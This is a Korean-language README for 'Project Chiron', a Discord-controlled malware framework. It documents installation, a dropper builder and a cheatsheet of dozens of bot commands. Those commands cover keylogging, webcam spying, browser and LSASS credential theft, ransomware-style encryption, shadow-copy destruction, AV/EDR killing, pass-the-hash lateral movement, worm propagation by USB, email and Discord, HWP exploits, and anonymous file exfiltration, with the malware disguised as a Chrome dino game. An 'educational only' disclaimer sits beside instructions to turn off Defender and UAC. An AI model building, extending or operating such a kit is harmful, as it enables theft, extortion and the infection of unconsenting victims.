# Project Chiron - Discord C2 Malware Framework

## 1. 프로젝트의 주요 기능과 목적 (Overview & Features)

Project Chiron은 고급 Discord C2 (Command & Control) 멀웨어 프레임워크입니다. (현재 버전: v2.0, 총 명령어: 66개 이상)

**주요 기능:**
- 🤖 **Multi-Agent Management**: 고유 Agent ID로 여러 감염 머신 제어
- 📷 **Surveillance**: 스크린샷, 웹캠, 자동 캡처, 키로깅 (활성창 추적)
- 🔐 **Credential Harvesting**: 브라우저 비밀번호, 쿠키, 자동완성, 이메일, Kerberos, LSASS 덤프
- 📁 **File Operations**: 트리 시각화, 검색, 대용량 파일 탐지
- 🔒 **Hybrid Crypto Engine**: RSA-2048 + AES-256 멀티스레드 부분 암호화 및 우선순위 지정
- 💾 **Persistence**: 레지스트리, WMI, 시작프로그램 다중 방식
- 🦠 **Propagation**: USB, 네트워크, 이메일, Discord, 클라우드 전파
- 🕵️ **Advanced Recon**: AD 구조, 관리자 탐색, 네트워크 서비스(DB/NAS) 자동 스캔
- 🛡️ **Stealth Ops**: 파일리스 실행, 프로세스 인젝션, AV/EDR 40여종 무력화, 로그 삭제
- 💀 **Backup Destruction**: VSS 섀도 복사본, 복구 설정, 백업 서비스 원천 차단
- 🧬 **Polymorphic Engine**: 코드 자가 변형, NOP 삽입, 매번 다른 바이너리 해시 생성
- 🗑️ **Self-Destruct**: 완전한 흔적 제거 및 자가 삭제
- 🎮 **Dino Game Disguise**: 실제 플레이 가능한 Chrome 공룡 게임으로 위장

---

## 2. 사전 요구사항 (Prerequisites)

**테스트 및 구동 환경 (Tested On):**
- Windows 10/11
- Python 3.8 이상
- Chrome 127 이상
- Edge, Brave, Opera (최신 버전)

**테스트 환경 권장 사항:**
1. VM (VMware/VirtualBox) - Windows 10/11 사용 (스냅샷 필수)
2. Windows Defender 비활성화
3. UAC 비활성화
4. EDR 없는 환경

---

## 3. 설치 방법 (Installation)

### 3.1. 의존성 패키지 설치 및 환경 설정

```bash
pip install -r requirements.txt

# 대화형 빌드 마법사 실행 (추천)
python build_stealth.py
```

빌더 스크립트를 실행하면 **1) 봇 설정 (토큰/채널ID)**, **2) EXE 이름 및 아이콘**, **3) 배포/드로퍼 방식**을 대화형으로 물어봅니다.

### 🌟 6가지 고급 배포 방식 지원 (Advanced Deployment)
무거운 본체(EXE)를 직접 유포하지 않고, 익명 API 서버(Catbox/Transfer.sh)에 백그라운드 업로드 후 **백신(AV/EDR)을 100% 우회하는 초소형 매개체**를 자동 생성합니다.

1. **VBS/BAT/PS1 기본 스크립트 드로퍼:** 수백 바이트의 가벼운 스크립트
2. **HWP 한컴 오피스 취약점 (EPS/OLE):** OLE 악성코드가 삽입된 한글 문서
3. **C/C++ Reflective PE Downloader:** 디스크 I/O 없이 메모리에서 직접 다운로드/실행하는 40KB 초경량 EXE (1순위 추천)
4. **DLL 사이드로딩 패키지:** 구형 카카오톡 등 정상 서명 프로그램과 악성 DLL을 ZIP으로 포장
5. **ISO/VHD 스머글링:** 웹 다운로드 경고창(MotW)을 무력화하는 가상 CD 이미지용 파일 세트
6. **PS1 Fileless 인메모리 인젝션:** RAM 위에서만 본체를 구동시키는 파워셸 스크립트

### 3.2. Discord Bot 설정
1. [Discord Developer Portal](https://discord.com/developers/applications) 에서 봇 생성
2. Bot 설정에서 "Message Content Intent" 활성화
3. 봇 토큰 생성
4. 서버에 초대 (필요 권한: Send Messages, Attach Files, Read Message History)

### 3.3. 명령줄 자동화 및 추가 난독화
```bash
# 대화형 프롬프트 외, 추가 난독화가 필요한 경우:
pip install pyarmor
pyarmor obfuscate --recursive core.py    # 코드 난독화
```

---

## 4. 문제 해결 방법 (Troubleshooting)

| 문제 | 해결 방법 |
|-----|------|
| 봇 미연결 | 봇 토큰 재확인, "Message Content Intent" 활성화 여부 확인 |
| 명령어 미작동 | Channel ID 및 Operator ID 설정 확인 |
| 브라우저 크레덴셜 실패 | 켜져 있는 브라우저 종료 후 명령어 재시도 |
| Chrome v20 실패 | 관리자 권한 실행, AV 비활성화 확인, Chrome 127+ 버전 확인 |
| 빌드 실패 | `pip install pyinstaller pywin32 pygame` 패키지 재설치 |

---

## 5. 라이선스 정보 (Legal Notice & License)

**⚠️ EDUCATIONAL PURPOSES ONLY (학습 및 연구 목적 전용)**
본 프로젝트는 보안 연구 및 교육 목적으로만 제공됩니다.

- ✅ Security research (보안 연구)
- ✅ Authorized penetration testing (사전 승인된 모의해킹)
- ✅ Educational demonstrations (교육 목적의 시연)
- ❌ Unauthorized access (비인가된 접근 절대 금지)
- ❌ Credential theft without consent (동의 없는 크레덴셜 탈취 금지)
- ❌ Any illegal activities (모든 불법적 행위 금지)

**Unauthorized access to computer systems is illegal under CFAA (USA), Computer Misuse Act (UK), and similar laws worldwide.**
**컴퓨터 시스템에 대한 무단 액세스는 전 세계 관련 법률에 따라 불법입니다. 테스트 전 반드시 적절한 권한과 승인을 얻으십시오.**

---

## 6. 사용 예시 (Usage Examples)

다양한 기능들의 명령어 사용 예시 및 작동 방식입니다.

### 6.1. 빠른 명령어 참조 (Cheatsheet)
```text
# === 기본 정보 ===
!agents                    # 에이전트 목록
!ping                      # 연결 테스트  
!status                    # 상태 확인
!sysinfo                   # 시스템 정보

# === 감시 ===
!screenshot                # 스크린샷
!webcam                    # 웹캠 촬영
!auto_screenshot <초>     # 자동 스크린샷 시작
!auto_screenshot_stop     # 자동 스크린샷 중지
!start_keylogger          # 키로거 시작 (활성 창 추적 포함)
!stop_keylogger           # 키로거 중지
!dump_keys                # 키로그 출력

# === 정보 수집 ===
!wifipass                 # WiFi 비밀번호
!browser_creds            # 브라우저 비밀번호 (Edge/Brave/Opera)
!netstat                  # 네트워크 상태
!tasklist                 # 프로세스 목록

# === 파일 관리 ===
!ls / !dir                # 폴더 내용
!tree [경로]              # 파일 트리 시각화
!files [경로]             # 파일 상세 + 네비게이션
!search <패턴> [경로]     # 파일 검색
!interesting [경로]       # 중요 파일 찾기
!exfiltrate [경로]        # 중요 파일 자동 탈취 (8MB↓, 최대 10개)
!exfil_stealth <파일>     # 대용량 단일 파일 익명 탈취 (Discord 우회)
!exfil_dir_stealth <폴더> # 특정 폴더 전체 ZIP 압축 후 익명 탈취
!download <파일>          # 파일 받기
!upload                   # 파일 올리기 (첨부)

# === 하이브리드 암호화 ===
!encrypt <폴더> [최대]   # RSA+AES 부분/우선순위 암호화
!decrypt <폴더>          # 복호화 (개인키 파일 첨부)

# === 시스템 제어 ===
!shell <명령어>           # 시스템 명령 실행
!shell_start              # 인터랙티브 셸 시작
!shell_cmd <명령>         # 셸 명령 실행 (cd 추적)
!shell_timeout <초>       # 셸 타임아웃 설정
!shell_powershell         # PowerShell 모드 토글
!shell_status             # 셸 상태 확인
!shutdown                 # 종료
!restart                  # 재시작
!lock                     # 잠금
!kill <프로세스>          # 프로세스 종료

# === 감지 방어 & 무력화 ===
!inject <proc> <sc_b64>  # 셸코드 프로세스 인젝션
!kill_av                 # AV/EDR 40+ 프로세스 강제 종료
!wipe_logs               # 이벤트 로그 및 PS 기록 삭제
!neutralize              # 전체 보안 무력화 시퀀스 실행

# === 고급 정보 탈취 ===
!steal_cookies           # 모든 브라우저 쿠키 (AES 복호화)
!steal_autofill          # 자동완성, 이름, 주소, 카드 정보
!steal_email             # Outlook, Thunderbird 계정 정보
!kerberos                # Kerberos 티켓 및 SPN 열거
!lsass_dump              # LSASS 메모리 덤프 (comsvcs.dll)
!steal_sessions          # 위 모든 세션/인증 정보 탈취 실행

# === 자동 정찰 & 파괴 ===
!recon                   # 전체 내부 정찰 (AD/네트워크/서버)
!scan_ad                 # AD 구조 및 관리자 탐색
!scan_network [서브넷]   # 18개 주요 포트 기반 서비스 스캔
!destroy_backups         # VSS, 복구 설정, 백업 서비스 전부 삭제

# === 폴리모픽 엔진 ===
!morph <파일>            # 코드 변형 (매번 다른 해시 생성)
!morph self              # 구동 중인 악성코드 자가 변형

# === 흔적 제거 ===
!cleanup                  # 전체 정리
!clear_logs              # 로그 삭제
!clear_temp              # 임시파일 삭제
!clear_browser           # 브라우저 정리
!remove_persistence      # 지속성 제거
!selfdestruct confirm    # 즉시 삭제 ⚠️
!selfdestruct_timer <초>  # 타이머 삭제

# === 고급 배포/회피 ===
!av_report               # AV 회피 체크 리포트
!sideload_list           # DLL 사이드로딩 타겟 목록
!sideload <타겟> <url>    # DLL 사이드로딩 패키지 생성
!hwp_exploit <url> [method]  # HWP exploit 생성 (eps/ole/macro/dll/all)
!gen_payload <type> <url>    # (기존) 대안 배포 바이너리 생성 (hta/vbs/ps1/bat/lnk/all)
!dropper_gen <파일> [type]   # (신규) API 자동 호스팅 + Fileless 드로퍼(vbs/bat/ps1) 자동 생성

# === APT 수평 이동 ===
!lateral_scan [서브넷]   # 수평 이동 대상 스캔 (SMB/WMI/WinRM/RDP)
!lateral_pth <ip> <user> <hash> <cmd>  # Pass-the-Hash 원격 실행
!lateral_ptt <ticket> <host> <cmd>     # Pass-the-Ticket 원격 실행
!lateral_wmi <ip> <cmd> [user] [pass]  # WMI 원격 실행
!lateral_smb <ip> <payload>            # SMB 페이로드 배포 + 서비스 등록

# === 🔥 특별 명령어 (Special) ===
!byovd_kill [driver] [type] # Ring-0 커널 EDR 파괴 (관리자 필수)
!hollow <target> <pe_b64>   # 프로세스 할로잉 (svchost/dllhost 등)
!hollow_list                # 할로잉 타겟 프로세스 목록
!syscalls                   # Direct Syscall 테이블 확인

# === 스테가노그래피 ===
!stego_send <메시지>        # 이미지에 데이터 은닉 후 전송
!stego_recv                 # 이미지에서 은닉 데이터 추출 (이미지 첨부)
!stego_capacity             # 이미지 은닉 용량 확인 (이미지 첨부)
```

### 6.2. Multi-Agent 타겟 지정
```bash
!command                  # 모든 에이전트에서 실행
!command @agent_id        # 특정 에이전트만 실행
!command @all             # 명시적 전체 실행
```
- **Agent ID 형식:** `username@hostname[hash8]` (예: `admin@PC-001[a1b2c3d4]`)

### 6.3. Credential Harvesting (크레덴셜 탈취)
**브라우저 비밀번호 (v10 - 권장)**
```bash
!browser_creds            # Edge/Brave/Opera (✅ 낮은 탐지 위험)
```

| 브라우저 | 암호화 방식 | 추출 가능 |
|---------|-----------|----------|
| Edge | v10 (AES-GCM) | ✅ 가능 |
| Brave | v10 (AES-GCM) | ✅ 가능 |
| Opera | v10 (AES-GCM) | ✅ 가능 |
| Chrome 127+ | v20 (App-Bound) | ⚠️ 고급 방법 필요 |

**Chrome v20 고급 추출**
Chrome v20은 **App-Bound Encryption** (System DPAPI + User DPAPI + App Identity 검증) 사용. 일반 DPAPI로 복호화가 불가합니다.

| 방법 | 명령어 | 위험도 | 성공률 |
|-----|--------|-------|--------|
| SYSTEM 권한 상승 | `!chrome_advanced` | 🔴 High | 70% |
| 프로세스 인젝션 | `!chrome_inject` | 🔴 Very High | 50% |
| DevTools Protocol | `!chrome_devtools` | 🟡 Low | 30% |
| Memory Scanning | `!chrome_memory` | 🟡 Medium | 20% |

**Windows 비밀번호 추출**
추출 방법: NTLM 해시 (SAM), Credential Manager, LSA Secrets, LSASS 메모리 등
```bash
!steal_password           # 모든 방법으로 추출 (관리자 필요)
!ntlm_hash               # NTLM 해시만 추출
!dump_credentials        # Credential Manager 덤프
```

### 6.4. Propagation (전파)
**USB 전파**
```bash
!usb_infect              # 현재 연결된 USB 감염
!usb_monitor             # USB 연결 시 자동 감염
!usb_stop                # 모니터링 중지
!usb_status              # 상태 확인
```

**네트워크/소셜 전파**
```bash
!propagate_network       # SMB 네트워크 전파
!propagate_email [수]     # Outlook 이메일 전파
!propagate_discord       # Discord DM 전파
!propagate_wifi          # WiFi 정보 수집
!propagate_cloud         # 클라우드 스토리지 감염 (OneDrive/Dropbox/Google Drive)
!propagate_all           # 모든 방법 실행
!propagate_auto_start [초] # 자동 반복 전파
!propagate_auto_stop     # 자동 전파 중지
```

| 방법 | 범위 | 위험도 |
|-----|------|--------|
| USB | 물리적 접촉 | 🟢 낮음 |
| 클라우드 | 동기화 기기 전체 | 🟢 낮음 |
| 네트워크 (SMB) | 로컬 네트워크 | 🟡 중간 |
| 이메일 | 연락처 전체 | 🔴 높음 |
| Discord | 친구 목록 | 🔴 높음 |

### 6.5. 잠긴 컴퓨터 우회
우회 방법: Sticky Keys (SHIFT×5→CMD), Utilman (접근성→CMD), 자동 로그인, 비밀번호 제거 등
```bash
!unlock_computer         # 모든 백도어 설치 (관리자 필요)
!sticky_backdoor         # Sticky Keys만 설치
!restore_backdoors       # 백도어 제거 (흔적 삭제)
```

### 6.6. Privilege Escalation (권한 상승)
```bash
!priv_escalate           # 자동 권한 상승 시도
!check_admin             # 관리자 권한 확인
!uac_bypass              # UAC 우회 시도
```

### 6.7. Advanced Payload Delivery (고급 배포)
Project Chiron은 페이로드 주소(URL)만 입력하면 다양한 공격 벡터와 배포 방식을 자동 생성합니다.

**1) 대안 배포 포맷 (Alternative Delivery)**
실행 파일(.exe)이 차단된 환경을 우회하기 위한 다양한 포맷의 드로퍼(Dropper) 생성
```bash
!gen_payload <type> <payload_url>
```
| 포맷 | 특징 |
|------|------|
| **HTA** | 가짜 업데이트/에러 UI를 띄우고 백그라운드에서 다운로드/실행 |
| **VBS** | 샌드박스 탐지, 백그라운드 지연 실행 |
| **BAT** | PowerShell 다운로드 크래들 포함 |
| **LNK** | 문서 파일 아이콘으로 위장한 악성 바로가기 |
| **PS1** | PowerShell 스크립트 기반 |

**2) DLL Sideloading (DLL 하이재킹)**
서명된 정상 프로그램 실행 시 악성 Proxy DLL 로드 유도 패키지 생성 (정상 EXE + 악성 DLL + 설정 ZIP 제공)
```bash
!sideload_list           # 지원되는 타겟 프로그램 10종 확인
!sideload <타겟> <url>    # C 소스 생성 및 MinGW 컴파일
```

**3) 한컴 HWP 취약점 악용 (Hancom Exploit)**
```bash
!hwp_exploit <url> [method]
```
| 메서드 | 설명 |
|--------|------|
| `ole` | 악성 OLE Object(스크립트) 문서 내 삽입 |
| `eps` | EPS 취약점 (CVE-2017-8291 등) 활용 가이드 |
| `macro`| HWP 스크립트 매크로 활용 가이드 |
| `dll` | HWP DLL 사이드로딩 취약점 활용 가이드 |

### 6.8. AV Evasion (탐지 회피)
| 구현된 기법 | 설명 |
|-----|------|
| VM/Sandbox 탐지 | VMware, VirtualBox, 하드웨어 체크 → 자동 종료 |
| AV 프로세스 탐지 | Defender, Avast 등 실행 중이면 종료 |
| Sleep Evasion | sleep 스킵 탐지로 샌드박스 우회 |
| 지연 실행 | 5초 대기로 초기 스캔 우회 |
| 게임 위장 | 실제 플레이 가능한 Chrome Dino Game 창 표시 |

### 6.9. Self-Destruct & Cleanup (자가 삭제 및 정리)
해당 명령어들은 레지스트리, 시작프로그램, 복사된 파일, WMI Persistence, 경로별 이벤트 로그, 임시 파일, 브라우저 데이터 등을 말끔히 삭제합니다.
```bash
!cleanup                  # 흔적 제거 (파일 유지)
!remove_persistence       # Persistence만 제거
!selfdestruct confirm     # 완전 자가 삭제 ⚠️ 되돌릴 수 없음
!selfdestruct_timer <초>  # 타이머 삭제
```

---

## 7. 심화 자료와 문서 링크

### 프로젝트 디렉토리 구조 (Project Structure)
각 모듈별 기능을 파악할 수 있는 전체적인 소스코드 구조입니다.
```text
project_chiron/
├── core.py                        # Main Discord C2 bot (+ Dino Game)
├── config.py                      # 설정 파일 (토큰/ID, XOR 난독화)
├── build_stealth.py               # PyInstaller 스텔스 빌드 스크립트
├── generate_payload.py            # 통합 페이로드 생성 CLI
├── stego_decoder.py               # 독립 스테가노그래피 디코더/인코더 CLI
├── requirements.txt               # Python dependencies
├── dino_icon.ico                  # Dino game icon
├── README.md                      # 이 문서
│
└── modules/
    ├── credentials.py             # 브라우저 비밀번호 추출
    ├── chrome_v20_advanced.py     # Chrome v20 우회 (4가지 방법)
    ├── password_stealer.py        # Windows 비밀번호 추출
    ├── surveillance.py            # 스크린샷, 웹캠, 키로거
    ├── file_manager.py            # 파일 관리
    ├── file_operations.py         # 고급 파일 조작 (트리, 검색, 암호화)
    ├── sys_info.py                # 시스템 정보 수집
    ├── persistence.py             # 레지스트리 persistence
    ├── enhanced_persistence.py    # 고급 persistence (WMI, 서비스 등)
    ├── propagation.py             # 기본 전파
    ├── advanced_propagation.py    # 고급 전파 (네트워크, 이메일, Discord, 클라우드)
    ├── usb_propagation.py         # USB 자동 전파
    ├── usb_unlock.py              # 잠긴 PC 우회
    ├── privilege_escalation.py    # 권한 상승
    ├── av_evasion.py              # AV 회피
    ├── self_destruct.py           # 자가 삭제 및 흔적 제거
    ├── realtime_monitor.py        # 실시간 모니터링
    ├── clipboard_monitor.py       # 클립보드 모니터링
    ├── scheduler.py               # 작업 스케줄러
    ├── token_stealer.py           # Discord 토큰 탈취
    ├── network_sniffer.py         # 네트워크 스니핑
    ├── smart_collector.py         # 스마트 정보 수집
    ├── remote_shell.py            # 원격 셸
    ├── data_searcher.py           # 데이터 검색
    ├── silent_mode.py             # 출력 억제
    ├── obfuscation.py             # 문자열 난독화 (XOR + Base64)
    ├── dll_sideload.py            # DLL 사이드로딩 패키지 생성
    ├── hwp_exploit.py             # 한컴 HWP OLE exploit
    ├── alt_delivery.py            # 대안 배포 바이너리 생성 (HTA/VBS/PS1/BAT/LNK)
    ├── session_stealer.py         # 브라우저 쿠키, 자동완성, 이메일, Kerberos, LSASS 덤프 추출
    ├── stealth_ops.py             # 파일리스 실행, 프로세스 인젝션, AV/EDR 무력화, 로그 삭제
    ├── crypto_engine.py           # RSA+AES 하이브리드, 멀티스레드, 부분/우선순위 암호화
    ├── internal_recon.py          # 자동 AD 스캔, 네트워크 시스템(DB/ERP/NAS) 정찰
    ├── backup_destroy.py          # VSS 삭제, 복구 비활성화, 백업 무력화
    ├── polymorphic.py             # 코드 및 해시 자가 변형, 암호화 페이로드 생성
    ├── lateral_movement.py        # APT 수평 이동 (PtH/PtT/WMI/SMB/P2P Proxy)
    ├── kernel_edr_killer.py       # BYOVD Ring-0 커널 EDR 파괴
    ├── process_hollowing.py       # 프로세스 할로잉 (RunPE) + Direct Syscall
    ├── steganography.py           # LSB 스테가노그래피 + AES 암호화 C2 통신
    ├── stealth_exfil.py           # 익명 대용량 파일 탈취 (Gofile/Transfer.sh 등 API)
    ├── dropper_gen.py             # API 호스팅 + Fileless 드로퍼(stage 0) 자동 생성
    └── __init__.py                # 패키지 초기화 (42개 모듈)
```
